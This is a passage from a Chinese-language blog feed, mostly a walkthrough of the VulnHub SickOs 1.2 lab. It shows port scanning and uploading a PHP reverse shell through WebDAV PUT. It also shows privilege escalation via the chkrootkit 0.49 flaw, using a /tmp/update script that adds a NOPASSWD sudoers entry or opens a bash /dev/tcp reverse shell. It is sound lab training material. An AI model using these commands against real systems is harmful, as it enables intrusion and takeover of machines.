class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 问题: 明明已经安装了nmap, import nmap却显示没有</span><br><span class="hljs-meta">#</span><span class="bash"> 原因: 安装时没有root权限, pip将包安在了当前用户目录下, 而Python的环境变量中没有该路径, 从而导致安装了却显示没有</span><br><span class="hljs-meta">$</span><span class="bash"> sudo pip3 install python-nmap</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
      <tag>Code</tag>
      
      <tag>Version</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SickOs：1.2</title>
    <link href="/2022/07/04/Penetration/Vulnhub/Part-1/0x0D%20SickOs-1.2/"/>
    <url>/2022/07/04/Penetration/Vulnhub/Part-1/0x0D%20SickOs-1.2/</url>
    
    <content type="html"><![CDATA[<h1 id="0x0D-SickOs-1-2-vulnhub"><a href="#0x0D-SickOs-1-2-vulnhub" class="headerlink" title="0x0D SickOs: 1.2~vulnhub"></a>0x0D SickOs: 1.2~vulnhub</h1><blockquote><p>靶机地址：<a href="https://www.vulnhub.com/entry/sickos-12,144/">SickOs: 1.2 ~ VulnHub</a></p><p>环境信息：</p><ul><li>攻击机 IP：192.168.135.141</li><li>靶机 IP：192.168.135.154</li></ul></blockquote><h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h3><p><strong>nmap 命令：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -sn 192.168.135.0/24</span><br></code></pre></td></tr></table></figure><p><strong>得到靶机 ip：192.168.135.154</strong></p><h3 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h3><p><strong>nmap 命令：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo nmap -sS -A -p- 192.168.135.154</span><br>[sudo] password for kali: <br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-07-04 04:16 EDT<br>Nmap scan report for 192.168.135.154 (192.168.135.154)<br>Host is up (0.00097s latency).<br>Not shown: 65533 filtered ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   1024 66:8c:c0:f2:85:7c:6c:c0:f6:ab:7d:48:04:81:c2:d4 (DSA)<br>|   2048 ba:86:f5:ee:cc:83:df:a6:3f:fd:c1:34:bb:7e:62:ab (RSA)<br>|_  256 a1:6c:fa:18:da:57:1d:33:2c:52:e4:ec:97:e2:9e:af (ECDSA)<br>80/tcp open  http    lighttpd 1.4.28<br>|_http-server-header: lighttpd/1.4.28<br>|_http-title: Site doesn&#x27;t have a title (text/html).<br>MAC Address: 00:0C:29:7C:BD:F7 (VMware)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device type: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.10 - 4.11, Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>TRACEROUTE<br>HOP RTT     ADDRESS<br>1   0.97 ms 192.168.135.154 (192.168.135.154)<br><br>Nmap done: 1 IP address (1 host up) scanned in 113.75 seconds<br></code></pre></td></tr></table></figure><p><strong>得到目标端口信息：</strong></p><div class="table-container"><table><thead><tr><th>PORT</th><th>STATE</th><th>SERVICE</th><th>VERSION</th></tr></thead><tbody><tr><td>22/tcp</td><td>open</td><td>ssh</td><td>OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)</td></tr><tr><td>80/tcp</td><td>open</td><td>http</td><td>lighttpd 1.4.28</td></tr></tbody></table></div><h3 id="3、端口探测"><a href="#3、端口探测" class="headerlink" title="3、端口探测"></a>3、端口探测</h3><p><strong>22端口</strong></p><p>暂时未得到 username 和 password 的相关信息，无法使用 ssh</p><p><strong>80端口</strong></p><p>访问发现只有一张图片，其他什么都没有，进行目录爆破，得到 test 目录：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> dirb http://192.168.135.154</span><br><br>-----------------<br>URL_BASE: http://192.168.135.154/<br>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt<br>-----------------<br><br>---- Scanning URL: http://192.168.135.154/ ----<br>+ http://192.168.135.154/index.php (CODE:200|SIZE:163)<br>==&gt; DIRECTORY: http://192.168.135.154/test/                                                                 <br></code></pre></td></tr></table></figure><p>访问 <code>http://192.168.135.154/test/</code> ，发现是个空目录。</p><h2 id="二、权限获取"><a href="#二、权限获取" class="headerlink" title="二、权限获取"></a>二、权限获取</h2><p>查找 lighttpd 漏洞：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> searchsploit lighttpd</span><br></code></pre></td></tr></table></figure><p>发现没有可用的，看来还是要把切入点放在扫出来的目录上 。</p><p>尝试使用 POST 方式上传文件和数据，都没有成功。</p><p>使用 curl 探测一下 test 目录可用的 http 方法：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> curl -v -X OPTIONS http://192.168.135.154/<span class="hljs-built_in">test</span>/</span><br>*   Trying 192.168.135.154:80...<br>* Connected to 192.168.135.154 (192.168.135.154) port 80 (#0)<br><span class="hljs-meta">&gt;</span><span class="bash"> OPTIONS /<span class="hljs-built_in">test</span>/ HTTP/1.1</span><br><span class="hljs-meta">&gt;</span><span class="bash"> Host: 192.168.135.154</span><br><span class="hljs-meta">&gt;</span><span class="bash"> User-Agent: curl/7.83.0</span><br><span class="hljs-meta">&gt;</span><span class="bash"> Accept: */*</span><br><span class="hljs-meta">&gt;</span><span class="bash"> </span><br>* Mark bundle as not supporting multiuse<br>&lt; HTTP/1.1 200 OK<br>&lt; DAV: 1,2<br>&lt; MS-Author-Via: DAV<br>&lt; Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK<br>&lt; Allow: OPTIONS, GET, HEAD, POST<br>&lt; Content-Length: 0<br>&lt; Date: Mon, 04 Jul 2022 16:29:47 GMT<br>&lt; Server: lighttpd/1.4.28<br>&lt; <br>* Connection #0 to host 192.168.135.154 left intact<br></code></pre></td></tr></table></figure><p>发现可以用 put 作为请求方式，尝试上传文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> curl -v -T php-reverse-shell.php http://192.168.135.154/<span class="hljs-built_in">test</span>/</span><br>*   Trying 192.168.135.154:80...<br>* Connected to 192.168.135.154 (192.168.135.154) port 80 (#0)<br><span class="hljs-meta">&gt;</span><span class="bash"> PUT /<span class="hljs-built_in">test</span>/php-reverse-shell.php HTTP/1.1</span><br><span class="hljs-meta">&gt;</span><span class="bash"> Host: 192.168.135.154</span><br><span class="hljs-meta">&gt;</span><span class="bash"> User-Agent: curl/7.83.0</span><br><span class="hljs-meta">&gt;</span><span class="bash"> Accept: */*</span><br><span class="hljs-meta">&gt;</span><span class="bash"> Content-Length: 5497</span><br><span class="hljs-meta">&gt;</span><span class="bash"> Expect: 100-continue</span><br><span class="hljs-meta">&gt;</span><span class="bash"> </span><br>* Mark bundle as not supporting multiuse<br>&lt; HTTP/1.1 417 Expectation Failed<br>&lt; Content-Type: text/html<br>&lt; Content-Length: 363<br>&lt; Connection: close<br>&lt; Date: Mon, 04 Jul 2022 17:35:25 GMT<br>&lt; Server: lighttpd/1.4.28<br>&lt; <br>&lt;?xml version=&quot;1.0&quot; encoding=&quot;iso-8859-1&quot;?&gt;<br>&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;<br>         &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;<br>&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot; xml:lang=&quot;en&quot; lang=&quot;en&quot;&gt;<br> &lt;head&gt;<br>  &lt;title&gt;417 - Expectation Failed&lt;/title&gt;<br> &lt;/head&gt;<br> &lt;body&gt;<br>  &lt;h1&gt;417 - Expectation Failed&lt;/h1&gt;<br> &lt;/body&gt;<br>&lt;/html&gt;<br>* Closing connection 0<br></code></pre></td></tr></table></figure><p>由于 curl 会发送一个带 Expect 头的报文，而 lighttpd 不支持这个头，因此无法上传成功。</p><p>添加头信息，将其设置为空，成功上传：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> curl -v -H <span class="hljs-string">&#x27;Expect:&#x27;</span> -T php-reverse-shell.php http://192.168.135.154/<span class="hljs-built_in">test</span>/</span><br>*   Trying 192.168.135.154:80...<br>* Connected to 192.168.135.154 (192.168.135.154) port 80 (#0)<br><span class="hljs-meta">&gt;</span><span class="bash"> PUT /<span class="hljs-built_in">test</span>/php-reverse-shell.php HTTP/1.1</span><br><span class="hljs-meta">&gt;</span><span class="bash"> Host: 192.168.135.154</span><br><span class="hljs-meta">&gt;</span><span class="bash"> User-Agent: curl/7.83.0</span><br><span class="hljs-meta">&gt;</span><span class="bash"> Accept: */*</span><br><span class="hljs-meta">&gt;</span><span class="bash"> Content-Length: 5497</span><br><span class="hljs-meta">&gt;</span><span class="bash"> </span><br>* We are completely uploaded and fine<br>* Mark bundle as not supporting multiuse<br>&lt; HTTP/1.1 201 Created<br>&lt; Content-Length: 0<br>&lt; Date: Mon, 04 Jul 2022 17:36:39 GMT<br>&lt; Server: lighttpd/1.4.28<br>&lt; <br>* Connection #0 to host 192.168.135.154 left intact<br></code></pre></td></tr></table></figure><p>kali 监听：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 1234</span>            <br>listening on [any] 1234 ...<br><br>WARNING: Failed to daemonise. This is quite common and not fatal. Connection timed out (110)<br></code></pre></td></tr></table></figure><p>一直监听不到，尝试更换端口，最后端口设为 8080 时成功监听到：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 8080</span><br>listening on [any] 8080 ...<br>connect to [192.168.135.141] from (UNKNOWN) [192.168.135.154] 49867<br>Linux ubuntu 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux<br> 10:44:46 up  1:47,  0 users,  load average: 0.00, 0.02, 0.05<br>USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=33(www-data) gid=33(www-data) groups=33(www-data)<br>/bin/sh: 0: can&#x27;t access tty; job control turned off<br><span class="hljs-meta">$</span><span class="bash"> whoami</span><br>www-data<br></code></pre></td></tr></table></figure><h2 id="三、权限提升"><a href="#三、权限提升" class="headerlink" title="三、权限提升"></a>三、权限提升</h2><p>查找 SUID：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null</span>                                              <br>/usr/sbin/pppd<br>/usr/sbin/uuidd<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/lib/openssh/ssh-keysign<br>/usr/lib/pt_chown<br>/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper<br>/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/bin/sudoedit<br>/usr/bin/traceroute6.iputils<br>/usr/bin/sudo<br>/usr/bin/chsh<br>/usr/bin/passwd<br>/usr/bin/chfn<br>/usr/bin/at<br>/usr/bin/mtr<br>/usr/bin/gpasswd<br>/usr/bin/newgrp<br>/bin/mount<br>/bin/ping6<br>/bin/fusermount<br>/bin/umount<br>/bin/ping<br>/bin/su<br></code></pre></td></tr></table></figure><p>查看计划任务，发现了 Chkrootkit：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">pwd</span></span><br>/<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">cd</span> /etc</span><br><span class="hljs-meta">$</span><span class="bash"> ls -l | grep cron</span><br>drwx------ 2 root root    4096 Apr 12  2016 cron.d<br>drwxr-xr-x 2 root root    4096 Apr 12  2016 cron.daily<br>drwxr-xr-x 2 root root    4096 Mar 30  2016 cron.hourly<br>drwxr-xr-x 2 root root    4096 Mar 30  2016 cron.monthly<br>drwxr-xr-x 2 root root    4096 Mar 30  2016 cron.weekly<br>-rw-r--r-- 1 root root     722 Jun 19  2012 crontab<br><span class="hljs-meta">$</span><span class="bash"> ls -l cron.daily</span>    <br>total 60<br>-rwxr-xr-x 1 root root 15399 Nov 15  2013 apt<br>-rwxr-xr-x 1 root root   314 Apr 18  2013 aptitude<br>-rwxr-xr-x 1 root root   502 Mar 31  2012 bsdmainutils<br>-rwxr-xr-x 1 root root  2032 Jun  4  2014 chkrootkit<br>-rwxr-xr-x 1 root root   256 Oct 14  2013 dpkg<br>-rwxr-xr-x 1 root root   338 Dec 20  2011 lighttpd<br>-rwxr-xr-x 1 root root   372 Oct  4  2011 logrotate<br>-rwxr-xr-x 1 root root  1365 Dec 28  2012 man-db<br>-rwxr-xr-x 1 root root   606 Aug 17  2011 mlocate<br>-rwxr-xr-x 1 root root   249 Sep 12  2012 passwd<br>-rwxr-xr-x 1 root root  2417 Jul  1  2011 popularity-contest<br>-rwxr-xr-x 1 root root  2947 Jun 19  2012 standard<br></code></pre></td></tr></table></figure><p>查看 Chkrootkit 版本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> chkrootkit -V</span><br>chkrootkit version 0.49<br></code></pre></td></tr></table></figure><p>查找利用脚本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> searchsploit chkrootkit</span>   <br>-------------------------------------------------------------------------- ---------------------------------<br> Exploit Title                                                            |  Path<br>-------------------------------------------------------------------------- ---------------------------------<br>Chkrootkit - Local Privilege Escalation (Metasploit)                      | linux/local/38775.rb<br>Chkrootkit 0.49 - Local Privilege Escalation                              | linux/local/33899.txt<br>-------------------------------------------------------------------------- ---------------------------------<br>Shellcodes: No Results<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> cat /usr/share/exploitdb/exploits/linux/<span class="hljs-built_in">local</span>/33899.txt</span>                   <br>We just found a serious vulnerability in the chkrootkit package, which<br>may allow local attackers to gain root access to a box in certain<br>configurations (/tmp not mounted noexec).<br><br>The vulnerability is located in the function slapper() in the<br>shellscript chkrootkit:<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"></span><br><span class="bash"><span class="hljs-comment"># SLAPPER.&#123;A,B,C,D&#125; and the multi-platform variant</span></span><br><span class="hljs-meta">#</span><span class="bash"></span><br><span class="bash"><span class="hljs-function"><span class="hljs-title">slapper</span></span> ()&#123;</span><br>   SLAPPER_FILES=&quot;$&#123;ROOTDIR&#125;tmp/.bugtraq $&#123;ROOTDIR&#125;tmp/.bugtraq.c&quot;<br>   SLAPPER_FILES=&quot;$SLAPPER_FILES $&#123;ROOTDIR&#125;tmp/.unlock $&#123;ROOTDIR&#125;tmp/httpd \<br><span class="hljs-meta">   $</span><span class="bash">&#123;ROOTDIR&#125;tmp/update <span class="hljs-variable">$&#123;ROOTDIR&#125;</span>tmp/.cinik <span class="hljs-variable">$&#123;ROOTDIR&#125;</span>tmp/.b<span class="hljs-string">&quot;a</span></span><br>   SLAPPER_PORT=&quot;0.0:2002 |0.0:4156 |0.0:1978 |0.0:1812 |0.0:2015 &quot;<br>   OPT=-an<br>   STATUS=0<br>   file_port=<br><br>   if $&#123;netstat&#125; &quot;$&#123;OPT&#125;&quot;|$&#123;egrep&#125; &quot;^tcp&quot;|$&#123;egrep&#125; &quot;$&#123;SLAPPER_PORT&#125;&quot;&gt;<br>/dev/null 2&gt;&amp;1<br>      then<br>      STATUS=1<br>      [ &quot;$SYSTEM&quot; = &quot;Linux&quot; ] &amp;&amp; file_port=`netstat -p $&#123;OPT&#125; | \<br>         $egrep ^tcp|$egrep &quot;$&#123;SLAPPER_PORT&#125;&quot; | $&#123;awk&#125; &#x27;&#123; print  $7 &#125;&#x27; |<br>tr -d :`<br>   fi<br>   for i in $&#123;SLAPPER_FILES&#125;; do<br>      if [ -f $&#123;i&#125; ]; then<br>         file_port=$file_port $i<br>         STATUS=1<br>      fi<br>   done<br>   if [ $&#123;STATUS&#125; -eq 1 ] ;then<br>      echo &quot;Warning: Possible Slapper Worm installed ($file_port)&quot;<br>   else<br>      if [ &quot;$&#123;QUIET&#125;&quot; != &quot;t&quot; ]; then echo &quot;not infected&quot;; fi<br>         return $&#123;NOT_INFECTED&#125;<br>   fi<br>&#125;<br><br><br>The line &#x27;file_port=$file_port $i&#x27; will execute all files specified in<br><span class="hljs-meta">$</span><span class="bash"><span class="hljs-string">SLAPPER_FILES as the user chkrootkit is running (usually root), if</span></span><br><span class="hljs-meta">$</span><span class="bash"><span class="hljs-string">file_port is empty, because of missing quotation marks around the</span></span><br>variable assignment.<br><br>Steps to reproduce:<br><br>- Put an executable file named &#x27;update&#x27; with non-root owner in /tmp (not<br>mounted noexec, obviously)<br>- Run chkrootkit (as uid 0)<br><br>Result: The file /tmp/update will be executed as root, thus effectively<br>rooting your box, if malicious content is placed inside the file.<br><br>If an attacker knows you are periodically running chkrootkit (like in<br>cron.daily) and has write access to /tmp (not mounted noexec), he may<br>easily take advantage of this.<br><br>Suggested fix: Put quotation marks around the assignment.<br><br>file_port=&quot;$file_port $i&quot;<br><br>I will also try to contact upstream, although the latest version of<br>chkrootkit dates back to 2009 - will have to see, if I reach a dev there.<br></code></pre></td></tr></table></figure><p>根据脚本描述，目标靶机的 Chkrootkit 会周期性以 root 身份执行 <code>/tmp/update</code> 文件 。</p><p>查看 tmp 目录是否可执行，创建  <code>/tmp/update</code> 文件，用于将当前用户写入 <code>/etc/sudoers</code> 文件，这样就可以直接 sudo提权了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ls -l / | grep tmp</span>      <br>drwxrwxrwt   4 root root  4096 Jul  4 10:54 tmp<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;chmod +w /etc/sudoers &amp;&amp; echo &quot;www-data ALL=(ALL) NOPASSWD: ALL&quot; &gt;&gt; /etc/sudoers &amp;&amp; chmod 440 /etc/sudoers&#x27;</span> &gt; /tmp/update</span><br><span class="hljs-meta">$</span><span class="bash"> cat /tmp/update</span><br>chmod +w /etc/sudoers &amp;&amp; echo &quot;www-data ALL=(ALL) NOPASSWD: ALL&quot; &gt;&gt; /etc/sudoers &amp;&amp; chmod 440 /etc/sudoers<br></code></pre></td></tr></table></figure><p>然后不成功，换成 bash 反弹依旧不行。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo su</span><br>sudo: no tty present and no askpass program specified<br>Sorry, try again.<br>sudo: no tty present and no askpass program specified<br>Sorry, try again.<br>sudo: no tty present and no askpass program specified<br>Sorry, try again.<br>sudo: 3 incorrect password attempts<br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;#!/bin/bash\nbash -i &gt;&amp; /dev/tcp/192.168.135.141/443 0&gt;&amp;1\n&#x27;</span> &gt; /tmp/update</span><br><span class="hljs-meta">$</span><span class="bash"> cat /tmp/update</span><br><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br>bash -i &gt;&amp; /dev/tcp/192.168.135.141/8080 0&gt;&amp;1<br></code></pre></td></tr></table></figure><p>在折腾好久之后发现 <code>/tmp/update</code> 文件没有执行权限，居然犯了这种低级错误，加了权限后成功进入 root ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ls -l /tmp/update</span><br>-rw-rw-rw- 1 www-data www-data 81 Jul  4 11:19 /tmp/update<br><span class="hljs-meta">$</span><span class="bash"> chmod +x /tmp/update</span><br><span class="hljs-meta">$</span><span class="bash"> ls -l /tmp/update</span><br>-rwxrwxrwx 1 www-data www-data 81 Jul  4 11:19 /tmp/update<br><span class="hljs-meta">$</span><span class="bash"> sudo su</span><br><span class="hljs-meta">$</span><span class="bash"> whoami</span><br>root<br><span class="hljs-meta">$</span><span class="bash"> id</span><br>uid=0(root) gid=0(root) groups=0(root)<br><span class="hljs-meta">$</span><span class="bash"> ls /root</span><br>304d840d52840689e0ab0af56d6d3a18-chkrootkit-0.49.tar.gz<br>7d03aaa2bf93d80040f3f22ec6ad9d5a.txt<br>chkrootkit-0.49<br>newRule<br><span class="hljs-meta">$</span><span class="bash"> cat /root/7d03aaa2bf93d80040f3f22ec6ad9d5a.txt</span><br>WoW! If you are viewing this, You have &quot;Sucessfully!!&quot; completed SickOs1.2, the challenge is more focused on elimination of tool in real scenarios where tools can be blocked during an assesment and thereby fooling tester(s), gathering more information about the target using different methods, though while developing many of the tools were limited/completely blocked, to get a feel of Old School and testing it manually.<br><br>Thanks for giving this try.<br><br>@vulnhub: Thanks for hosting this UP!.<br></code></pre></td></tr></table></figure><h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>1、PUT 方式文件上传：curl</p><p>2、反弹 shell 端口受限，可以尝试更换常用端口</p><p>3、计划任务：<code>ls -l /etc | grep cron</code></p><p>4、Chkrootkit 提权：追加当前用户至 sudoer ，sudo 提权</p><h2 id="五、Others"><a href="#五、Others" class="headerlink" title="五、Others"></a>五、Others</h2><h3 id="1、PUT-方法上传"><a href="#1、PUT-方法上传" class="headerlink" title="1、PUT 方法上传"></a>1、PUT 方法上传</h3><p><strong>M1：通过 burpsuite 使用 PUT 方法上传</strong></p><p>抓包 —&gt; 更改为 PUT 请求、添加一句话木马 —&gt; 上传成功</p><p><strong>M2：通过 nmap 使用 PUT 方法上传</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span 